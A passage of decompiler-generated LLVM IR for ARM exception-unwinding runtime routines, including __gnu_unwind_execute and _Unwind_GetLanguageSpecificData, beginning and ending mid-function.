  store i32 %v8_1aadc, i32* @ip, align 4
  store i32 %v5_1aadc, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_1aadc)
  ret i32 %v2_1aae8

; uselistorder directives
  uselistorder i32 %v8_1aadc, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 70, 71, 72, 73, 16, 17, 6, 7, 1, 76, 8, 74, 75, 14, 15, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 2, 110, 111, 112, 113, 114, 115, 116, 117, 118, 9, 119, 120, 121, 22, 23, 10, 55, 56, 57, 3, 58, 59, 60, 61, 62, 63, 64, 65, 66, 24, 25, 11, 26, 12, 13, 21, 27, 28, 67, 68, 0, 69, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 4, 18, 19, 20, 46, 47, 48, 49, 50, 51, 52, 5, 53, 54 }
  uselistorder i32 40, { 30, 26, 27, 28, 29, 11, 31, 2, 12, 4, 5, 1, 6, 3, 13, 14, 7, 15, 16, 17, 18, 19, 20, 22, 21, 0, 8, 23, 9, 24, 10, 25 }
  uselistorder i32* @sb, { 122, 123, 124, 3, 4, 5, 6, 105, 106, 107, 108, 109, 110, 111, 112, 113, 116, 114, 115, 117, 2, 87, 88, 72, 73, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 24, 25, 30, 31, 26, 27, 28, 29, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 1, 63, 64, 65, 66, 67, 68, 69, 70, 71, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 118, 119, 120, 121 }
  uselistorder i32 36, { 17, 16, 4, 18, 6, 7, 5, 13, 15, 8, 14, 9, 0, 1, 2, 3, 10, 11, 12 }
  uselistorder i32* @r8, { 276, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 1, 275, 0, 37, 277, 9, 278, 38, 39, 40, 41, 24, 25, 26, 27, 28, 29, 30, 31, 32, 3, 33, 34, 35, 36, 42, 43, 44, 45, 10, 279, 21, 22, 4, 23, 213, 214, 5, 215, 216, 217, 218, 219, 220, 221, 222, 7, 223, 224, 225, 226, 227, 228, 229, 230, 11, 162, 163, 164, 165, 12, 176, 177, 178, 179, 180, 143, 144, 145, 146, 181, 182, 183, 184, 13, 14, 88, 89, 90, 91, 92, 185, 186, 187, 188, 93, 94, 95, 96, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 16, 17, 18, 19, 20, 15, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 81, 78, 79, 80, 82, 83, 84, 85, 86, 87, 97, 98, 99, 100, 101, 102, 103, 104, 105, 109, 106, 107, 108, 110, 111, 112, 113, 114, 116, 115, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 166, 167, 2, 171, 168, 169, 170, 172, 173, 174, 175, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 6, 209, 210, 211, 212, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 255, 252, 253, 254, 8, 256, 257 }
  uselistorder i32 32, { 110, 107, 108, 109, 65, 111, 112, 61, 79, 113, 60, 106, 66, 62, 92, 90, 91, 87, 88, 89, 96, 97, 93, 94, 81, 82, 67, 102, 103, 104, 1, 2, 4, 3, 105, 6, 5, 8, 7, 10, 9, 63, 68, 64, 101, 69, 95, 12, 11, 14, 13, 70, 83, 71, 84, 72, 85, 73, 86, 16, 15, 18, 17, 80, 20, 19, 21, 23, 22, 25, 24, 26, 27, 29, 28, 74, 75, 98, 30, 99, 31, 100, 32, 33, 34, 35, 36, 37, 76, 38, 39, 40, 77, 41, 0, 42, 43, 44, 46, 45, 48, 47, 50, 49, 51, 53, 52, 55, 54, 57, 56, 58, 59, 78 }
  uselistorder i32 28, { 50, 11, 33, 51, 30, 52, 53, 54, 55, 7, 34, 35, 31, 32, 40, 12, 36, 13, 47, 48, 49, 8, 14, 15, 37, 0, 20, 1, 21, 2, 22, 3, 23, 4, 24, 5, 25, 16, 26, 17, 27, 18, 28, 6, 29, 9, 19, 39, 38, 41, 42, 43, 44, 45, 46, 10 }
  uselistorder i32 24, { 107, 106, 108, 11, 12, 109, 0, 65, 66, 67, 68, 69, 70, 63, 64, 13, 71, 72, 82, 83, 73, 74, 8, 14, 100, 101, 102, 103, 1, 84, 85, 86, 41, 42, 15, 75, 76, 49, 77, 60, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 16, 55, 17, 56, 18, 57, 58, 59, 61, 62, 78, 79, 80, 81, 19, 20, 21, 22, 2, 23, 24, 9, 87, 88, 25, 26, 3, 27, 89, 28, 29, 30, 10, 90, 31, 32, 33, 91, 34, 4, 92, 93, 94, 95, 35, 36, 96, 37, 97, 38, 5, 98, 6, 39, 99, 7, 43, 104, 40, 105 }
  uselistorder i32 20, { 126, 124, 125, 127, 1, 4, 11, 35, 128, 31, 129, 130, 131, 132, 5, 133, 134, 2, 135, 36, 12, 32, 33, 34, 37, 38, 39, 50, 51, 40, 41, 136, 113, 114, 115, 116, 117, 118, 119, 13, 120, 121, 122, 3, 52, 14, 53, 54, 0, 25, 43, 44, 15, 45, 16, 46, 24, 17, 47, 42, 48, 49, 55, 57, 6, 56, 58, 59, 60, 61, 62, 63, 7, 64, 65, 66, 67, 68, 69, 71, 72, 18, 70, 73, 74, 75, 76, 77, 78, 80, 81, 19, 79, 82, 83, 84, 85, 87, 88, 20, 86, 89, 90, 91, 92, 93, 94, 96, 21, 95, 97, 98, 99, 102, 8, 100, 22, 101, 103, 104, 107, 9, 105, 23, 106, 108, 26, 27, 28, 29, 30, 109, 110, 111, 10, 112, 123 }
  uselistorder i32* @r1, { 190, 15, 16, 17, 4, 191, 192, 64, 65, 81, 44, 2, 194, 45, 193, 188, 46, 47, 48, 18, 66, 1, 67, 68, 19, 197, 20, 5, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 6, 215, 216, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 70, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 3, 80, 25, 128, 96, 97, 217, 21, 219, 220, 221, 222, 102, 103, 83, 29, 30, 218, 22, 31, 32, 129, 130, 174, 175, 176, 177, 178, 179, 180, 43, 181, 7, 182, 183, 8, 184, 187, 185, 9, 186, 84, 85, 23, 131, 132, 133, 189, 121, 122, 12, 33, 34, 35, 36, 37, 38, 39, 10, 225, 226, 227, 228, 0, 229, 24, 82, 98, 134, 223, 224, 135, 26, 195, 196, 27, 13, 86, 99, 136, 137, 28, 138, 139, 87, 88, 40, 41, 42, 89, 90, 91, 92, 93, 123, 94, 95, 14, 100, 101, 124, 125, 11, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 126, 127, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173 }
  uselistorder i32 60, { 3, 25, 26, 27, 4, 5, 1, 6, 18, 19, 20, 21, 22, 23, 7, 14, 15, 8, 16, 17, 9, 10, 0, 11, 12, 13, 2, 24 }
  uselistorder i32 56, { 3, 37, 38, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 15, 14, 2, 16, 17, 18, 19, 20, 34, 35, 31, 32, 4, 5, 1, 6, 0, 7, 33, 36, 8, 11, 9, 12, 10, 13 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1aaf8 = load i32, i32* @r0, align 4
  ret i32 %v1_1aaf8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1ab00 = load i32, i32* @r0, align 4
  ret i32 %v1_1ab00
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1ab14 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1ab18 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_1ab14, i32 0)
  ret i32 %v2_1ab18

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1ab38 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1ab3c = call i32 @__gnu_Unwind_Resume(i32 %v2_1ab38, i32 0)
  ret i32 %v2_1ab3c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1ab5c = ptrtoint i32* %stack_var_-68 to i32
  %v2_1ab60 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_1ab5c, i32 0)
  ret i32 %v2_1ab60

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1ab80 = ptrtoint i32* %stack_var_-68 to i32
  %v6_1ab84 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_1ab80, i32 %arg2, i8* %arg3, i32 %v2_1ab80)
  ret i32 %v6_1ab84

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1abb0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1abb8 = add i32 %tmp1, 76
  %v2_1abb8 = inttoptr i32 %v1_1abb8 to i32*
  %v3_1abb8 = load i32, i32* %v2_1abb8, align 4
  %v1_1abbc = add i32 %v3_1abb8, 7
  %v2_1abbc = inttoptr i32 %v1_1abbc to i8*
  %v3_1abbc = load i8, i8* %v2_1abbc, align 1
  %v4_1abbc = zext i8 %v3_1abbc to i32
  %v1_1abc0 = add i32 %v3_1abb8, 8
  %v3_1abc4 = mul nuw nsw i32 %v4_1abbc, 4
  %v2_1abc8 = add i32 %v3_1abc4, %v1_1abc0
  %v3_1abc8 = inttoptr i32 %v2_1abc8 to i8*
  ret i8* %v3_1abc8
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_1abd8 = load i32, i32* @r6, align 4
  %v21_1abd8 = load i32, i32* @lr, align 4
  %v0_1abdc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1abdc, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_1abec

dec_label_pc_1abec:                               ; preds = %dec_label_pc_1abec.backedge, %entry
  %v3_1abf8 = phi i32 [ %v0_1abec.pre, %dec_label_pc_1abec.backedge ], [ %tmp, %entry ]
  %v1_1abec = add i32 %v3_1abf8, 8
  %v2_1abec = inttoptr i32 %v1_1abec to i8*
  %v3_1abec = load i8, i8* %v2_1abec, align 1
  %v4_1abec = zext i8 %v3_1abec to i32
  store i32 %v4_1abec, i32* %r3.global-to-local, align 4
  %v2_1abf0 = icmp eq i8 %v3_1abec, 0
  store i1 %v2_1abf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1abf0, label %dec_label_pc_1ac00, label %.thread

.thread:                                          ; preds = %dec_label_pc_1abec
  %v2_1abf4 = add nsw i32 %v4_1abec, -1
  store i32 %v2_1abf4, i32* %r3.global-to-local, align 4
  %v2_1abf8 = trunc i32 %v2_1abf4 to i8
  store i8 %v2_1abf8, i8* %v2_1abec, align 1
  %v0_1abfc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1abfc.pr.pr, label %.thread.dec_label_pc_1ac00_crit_edge, label %dec_label_pc_1ac28

.thread.dec_label_pc_1ac00_crit_edge:             ; preds = %.thread
  %v0_1ac00.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ac00

dec_label_pc_1ac00:                               ; preds = %.thread.dec_label_pc_1ac00_crit_edge, %dec_label_pc_1abec
  %v0_1ac00 = phi i32 [ %v0_1ac00.pre, %.thread.dec_label_pc_1ac00_crit_edge ], [ %v3_1abf8, %dec_label_pc_1abec ]
  %v1_1ac00 = add i32 %v0_1ac00, 9
  %v2_1ac00 = inttoptr i32 %v1_1ac00 to i8*
  %v3_1ac00 = load i8, i8* %v2_1ac00, align 1
  %v4_1ac00 = zext i8 %v3_1ac00 to i32
  store i32 %v4_1ac00, i32* %r3.global-to-local, align 4
  %v2_1ac04 = icmp eq i8 %v3_1ac00, 0
  store i1 %v2_1ac04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac04, label %dec_label_pc_1ad08, label %dec_label_pc_1ac0c

dec_label_pc_1ac0c:                               ; preds = %dec_label_pc_1acfc, %dec_label_pc_1ac00
  %v2_1ac10 = phi i32 [ %v0_1acfc, %dec_label_pc_1acfc ], [ %v0_1ac00, %dec_label_pc_1ac00 ]
  %v0_1ac0c = phi i32 [ %v4_1acfc, %dec_label_pc_1acfc ], [ %v4_1ac00, %dec_label_pc_1ac00 ]
  %v1_1ac0c = add nsw i32 %v0_1ac0c, -1
  store i32 %v1_1ac0c, i32* %r3.global-to-local, align 4
  %v1_1ac10 = trunc i32 %v1_1ac0c to i8
  %v3_1ac10 = add i32 %v2_1ac10, 9
  %v4_1ac10 = inttoptr i32 %v3_1ac10 to i8*
  store i8 %v1_1ac10, i8* %v4_1ac10, align 1
  %v0_1ac14 = load i32, i32* @r5, align 4
  %v1_1ac14 = add i32 %v0_1ac14, 4
  %v2_1ac14 = inttoptr i32 %v1_1ac14 to i32*
  %v3_1ac14 = load i32, i32* %v2_1ac14, align 4
  store i32 %v3_1ac14, i32* %r2.global-to-local, align 4
  %v1_1ac18 = inttoptr i32 %v3_1ac14 to i32*
  %v2_1ac18 = load i32, i32* %v1_1ac18, align 4
  store i32 %v2_1ac18, i32* %r0.global-to-local, align 4
  %v4_1ac18 = add i32 %v3_1ac14, 4
  store i32 %v4_1ac18, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1ac20 = inttoptr i32 %v0_1ac14 to i32*
  store i32 %v2_1ac18, i32* %v1_1ac20, align 4
  %v5_1ac20 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1ac20, i32* %v2_1ac14, align 4
  %v0_1ac24 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ac24 = trunc i32 %v0_1ac24 to i8
  %v2_1ac24 = load i32, i32* @r5, align 4
  %v3_1ac24 = add i32 %v2_1ac24, 8
  %v4_1ac24 = inttoptr i32 %v3_1ac24 to i8*
  store i8 %v1_1ac24, i8* %v4_1ac24, align 1
  br label %dec_label_pc_1ac28

dec_label_pc_1ac28:                               ; preds = %.thread, %dec_label_pc_1ac0c, %.thread6
  %v0_1ac28 = load i32, i32* @r5, align 4
  %v1_1ac28 = inttoptr i32 %v0_1ac28 to i32*
  %v2_1ac28 = load i32, i32* %v1_1ac28, align 4
  %v3_1ac2c = udiv i32 %v2_1ac28, 16777216
  store i32 %v3_1ac2c, i32* @r4, align 4
  store i32 %v3_1ac2c, i32* %ip.global-to-local, align 4
  %v3_1ac34 = mul i32 %v2_1ac28, 256
  store i32 %v3_1ac34, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_1ac28, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_1ac34, i32* %v1_1ac28, align 4
  br i1 %tmp183, label %dec_label_pc_1ad08, label %dec_label_pc_1ac44

dec_label_pc_1ac44:                               ; preds = %dec_label_pc_1ac28
  %v0_1ac44 = load i32, i32* @r4, align 4
  %v1_1ac44 = and i32 %v0_1ac44, 128
  store i32 %v1_1ac44, i32* %r1.global-to-local, align 4
  %v2_1ac44 = icmp eq i32 %v1_1ac44, 0
  store i1 %v2_1ac44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac44, label %dec_label_pc_1ad20, label %dec_label_pc_1ac4c

dec_label_pc_1ac4c:                               ; preds = %dec_label_pc_1ac44
  %v1_1ac4c = and i32 %v0_1ac44, 240
  store i32 %v1_1ac4c, i32* @r6, align 4
  %v7_1ac50 = icmp eq i32 %v1_1ac4c, 128
  store i1 %v7_1ac50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ac50, label %dec_label_pc_1ac58, label %dec_label_pc_1ad7c

dec_label_pc_1ac58:                               ; preds = %dec_label_pc_1ac4c
  %v0_1ac58 = load i32, i32* @r5, align 4
  %v1_1ac58 = add i32 %v0_1ac58, 8
  %v2_1ac58 = inttoptr i32 %v1_1ac58 to i8*
  %v3_1ac58 = load i8, i8* %v2_1ac58, align 1
  %v4_1ac58 = zext i8 %v3_1ac58 to i32
  store i32 %v4_1ac58, i32* %r3.global-to-local, align 4
  %v2_1ac5c = icmp eq i8 %v3_1ac58, 0
  store i1 %v2_1ac5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac5c, label %dec_label_pc_1ac6c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1ac58
  %v2_1ac60 = add nsw i32 %v4_1ac58, -1
  store i32 %v2_1ac60, i32* %r3.global-to-local, align 4
  %v2_1ac64 = trunc i32 %v2_1ac60 to i8
  store i8 %v2_1ac64, i8* %v2_1ac58, align 1
  %v0_1ac68.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ac68.pr.pr, label %.thread3.dec_label_pc_1ac6c_crit_edge, label %dec_label_pc_1ac9c

.thread3.dec_label_pc_1ac6c_crit_edge:            ; preds = %.thread3
  %v0_1ac6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ac6c

dec_label_pc_1ac6c:                               ; preds = %.thread3.dec_label_pc_1ac6c_crit_edge, %dec_label_pc_1ac58
  %v2_1ac80 = phi i32 [ %v0_1ac6c.pre, %.thread3.dec_label_pc_1ac6c_crit_edge ], [ %v0_1ac58, %dec_label_pc_1ac58 ]
  %v1_1ac6c = add i32 %v2_1ac80, 9
  %v2_1ac6c = inttoptr i32 %v1_1ac6c to i8*
  %v3_1ac6c = load i8, i8* %v2_1ac6c, align 1
  %v4_1ac6c = zext i8 %v3_1ac6c to i32
  store i32 %v4_1ac6c, i32* %r3.global-to-local, align 4
  %v2_1ac70 = icmp eq i8 %v3_1ac6c, 0
  store i1 %v2_1ac70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac70, label %dec_label_pc_1acac, label %dec_label_pc_1ac7c

dec_label_pc_1ac7c:                               ; preds = %dec_label_pc_1ac6c
  %v1_1ac7c = add nsw i32 %v4_1ac6c, -1
  store i32 %v1_1ac7c, i32* %r3.global-to-local, align 4
  %v1_1ac80 = trunc i32 %v1_1ac7c to i8
  store i8 %v1_1ac80, i8* %v2_1ac6c, align 1
  %v0_1ac84 = load i32, i32* @r5, align 4
  %v1_1ac84 = add i32 %v0_1ac84, 4
  %v2_1ac84 = inttoptr i32 %v1_1ac84 to i32*
  %v3_1ac84 = load i32, i32* %v2_1ac84, align 4
  store i32 %v3_1ac84, i32* %r2.global-to-local, align 4
  %v1_1ac88 = inttoptr i32 %v3_1ac84 to i32*
  %v2_1ac88 = load i32, i32* %v1_1ac88, align 4
  store i32 %v2_1ac88, i32* %r0.global-to-local, align 4
  %v4_1ac88 = add i32 %v3_1ac84, 4
  store i32 %v4_1ac88, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1ac88, i32* %v2_1ac84, align 4
  %v0_1ac94 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ac94 = trunc i32 %v0_1ac94 to i8
  %v2_1ac94 = load i32, i32* @r5, align 4
  %v3_1ac94 = add i32 %v2_1ac94, 8
  %v4_1ac94 = inttoptr i32 %v3_1ac94 to i8*
  store i8 %v1_1ac94, i8* %v4_1ac94, align 1
  %v0_1ac98 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ac98 = load i32, i32* @r5, align 4
  %v2_1ac98 = inttoptr i32 %v1_1ac98 to i32*
  store i32 %v0_1ac98, i32* %v2_1ac98, align 4
  br label %dec_label_pc_1ac9c

dec_label_pc_1ac9c:                               ; preds = %.thread3, %dec_label_pc_1ac7c
  %v0_1ac9c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1ac9c, i32* %r3.global-to-local, align 4
  %v3_1aca0 = mul i32 %v0_1ac9c, 256
  store i32 %v3_1aca0, i32* %r0.global-to-local, align 4
  %v1_1aca4 = load i32, i32* @r5, align 4
  %v2_1aca4 = inttoptr i32 %v1_1aca4 to i32*
  store i32 %v3_1aca0, i32* %v2_1aca4, align 4
  %v0_1aca8 = load i32, i32* %r3.global-to-local, align 4
  %v3_1aca8 = udiv i32 %v0_1aca8, 16777216
  br label %dec_label_pc_1acac

dec_label_pc_1acac:                               ; preds = %dec_label_pc_1ac6c, %dec_label_pc_1ac9c
  %storemerge133 = phi i32 [ %v3_1aca8, %dec_label_pc_1ac9c ], [ 176, %dec_label_pc_1ac6c ]
  %v1_1acac = load i32, i32* %ip.global-to-local, align 4
  %v4_1acac = mul i32 %v1_1acac, 256
  %v5_1acac = or i32 %v4_1acac, %storemerge133
  store i32 %v5_1acac, i32* %r2.global-to-local, align 4
  %v7_1acb0 = icmp eq i32 %v5_1acac, 32768
  store i1 %v7_1acb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1acb0, label %dec_label_pc_1aebc, label %dec_label_pc_1acb8

dec_label_pc_1acb8:                               ; preds = %dec_label_pc_1acac
  %v3_1acb8 = mul i32 %v5_1acac, 16
  store i32 %v3_1acb8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1acc8 = and i32 %v3_1acb8, 65520
  store i32 %v3_1acc8, i32* %r2.global-to-local, align 4
  %v0_1accc = load i32, i32* @r7, align 4
  store i32 %v0_1accc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_1acd4 = call i32 @_Unwind_VRS_Pop(i32 %v0_1accc, i32 %v3_1acc8, i32 0, i32 0)
  store i32 %v4_1acd4, i32* %r0.global-to-local, align 4
  %v2_1acd8 = icmp eq i32 %v4_1acd4, 0
  store i1 %v2_1acd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1acd8, label %dec_label_pc_1ace0, label %dec_label_pc_1aebc

dec_label_pc_1ace0:                               ; preds = %dec_label_pc_1acb8
  %v0_1ace0 = load i32, i32* @r5, align 4
  %v1_1ace0 = add i32 %v0_1ace0, 8
  %v2_1ace0 = inttoptr i32 %v1_1ace0 to i8*
  %v3_1ace0 = load i8, i8* %v2_1ace0, align 1
  %v4_1ace0 = zext i8 %v3_1ace0 to i32
  store i32 %v4_1ace0, i32* %r3.global-to-local, align 4
  %v0_1ace4 = load i32, i32* @r4, align 4
  %v1_1ace4 = and i32 %v0_1ace4, 32768
  %v2_1ace4 = icmp eq i32 %v1_1ace4, 0
  store i1 %v2_1ace4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ace4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_1ace0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1ace0, %bb147
  %v2_1acec = icmp eq i8 %v3_1ace0, 0
  store i1 %v2_1acec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1acec, label %dec_label_pc_1acfc, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_1acf0 = add nsw i32 %v4_1ace0, -1
  store i32 %v2_1acf0, i32* %r3.global-to-local, align 4
  %v2_1acf4 = trunc i32 %v2_1acf0 to i8
  store i8 %v2_1acf4, i8* %v2_1ace0, align 1
  %v0_1acf8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1acf8.pr.pr, label %.thread6.dec_label_pc_1acfc_crit_edge, label %dec_label_pc_1ac28

.thread6.dec_label_pc_1acfc_crit_edge:            ; preds = %.thread6
  %v0_1acfc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1acfc

dec_label_pc_1acfc:                               ; preds = %bb148, %.thread6.dec_label_pc_1acfc_crit_edge
  %v0_1acfc = phi i32 [ %v0_1acfc.pre, %.thread6.dec_label_pc_1acfc_crit_edge ], [ %v0_1ace0, %bb148 ]
  %v1_1acfc = add i32 %v0_1acfc, 9
  %v2_1acfc = inttoptr i32 %v1_1acfc to i8*
  %v3_1acfc = load i8, i8* %v2_1acfc, align 1
  %v4_1acfc = zext i8 %v3_1acfc to i32
  store i32 %v4_1acfc, i32* %r3.global-to-local, align 4
  %v2_1ad00 = icmp eq i8 %v3_1acfc, 0
  store i1 %v2_1ad00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad00, label %dec_label_pc_1ad08, label %dec_label_pc_1ac0c

dec_label_pc_1ad08:                               ; preds = %dec_label_pc_1acfc, %dec_label_pc_1ac00, %dec_label_pc_1ac28
  %v0_1ad08 = load i32, i32* @sl, align 4
  %v2_1ad08 = icmp eq i32 %v0_1ad08, 0
  store i1 %v2_1ad08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ad08, label %dec_label_pc_1add0, label %bb149

bb149:                                            ; preds = %dec_label_pc_1ad08
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ad14

dec_label_pc_1ad14:                               ; preds = %bb149, %dec_label_pc_1b284, %dec_label_pc_1b124, %dec_label_pc_1af48, %dec_label_pc_1af00, %dec_label_pc_1aebc, %dec_label_pc_1add0
  %v1_1ad1c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_1b284 ], [ 9, %dec_label_pc_1b124 ], [ 9, %dec_label_pc_1af48 ], [ 9, %dec_label_pc_1af00 ], [ 9, %dec_label_pc_1aebc ], [ %v0_1ae04, %dec_label_pc_1add0 ]
  store i32 %v9_1abd8, i32* %r6.global-to-local, align 4
  store i32 %v21_1abd8, i32* @lr, align 4
  ret i32 %v1_1ad1c

dec_label_pc_1ad20:                               ; preds = %dec_label_pc_1ac44
  %v1_1ad20 = mul i32 %v0_1ac44, 4
  %v3_1ad24 = and i32 %v1_1ad20, 252
  store i32 %v3_1ad24, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1ad30 = load i32, i32* @r7, align 4
  store i32 %v0_1ad30, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_1ad38 = add nuw nsw i32 %v3_1ad24, 4
  store i32 %v1_1ad38, i32* %r6.global-to-local, align 4
  %v5_1ad40 = call i32 @_Unwind_VRS_Get(i32 %v0_1ad30, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_1ad44 = load i32, i32* @r4, align 4
  %v1_1ad44 = and i32 %v0_1ad44, 64
  %v2_1ad44 = icmp eq i32 %v1_1ad44, 0
  store i1 %v2_1ad44, i1* %cpsr_z.global-to-local, align 1
  %v4_1ad4c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1ad58 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_1ad58
  %storemerge160.p = select i1 %v2_1ad44, i32 %v2_1ad58, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1ad4c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
